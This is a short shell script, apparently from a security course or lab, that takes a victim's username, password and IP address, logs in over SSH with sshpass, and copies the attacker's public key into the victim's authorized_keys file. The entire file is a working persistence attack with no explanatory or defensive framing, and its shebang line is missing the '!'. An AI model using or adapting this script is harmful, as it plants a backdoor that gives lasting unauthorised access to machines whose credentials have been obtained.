#/bin/sh

usage() {
  echo "Usage: $0 <target username> <target password> <target IP>" 1>&2;
  exit 1;
}

payload() {
    local victim_username="$1"
    local victim_password="$2"
    local victim_ip="$3"
    local public_key="/home/cs2019/.ssh/id_rsa.pub"
    local key_inject_location="~/.ssh/authorized_keys"
    sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "mkdir -m 700 ~/.ssh/"
    sshpass -p "$victim_password" scp "$public_key" "$victim_username"@"$victim_ip":"$key_inject_location"
}

main() {
  if [ "$#" -eq 3 ]; then
    payload "$1" "$2" "$3"
  else
    usage
  fi
}
main $*
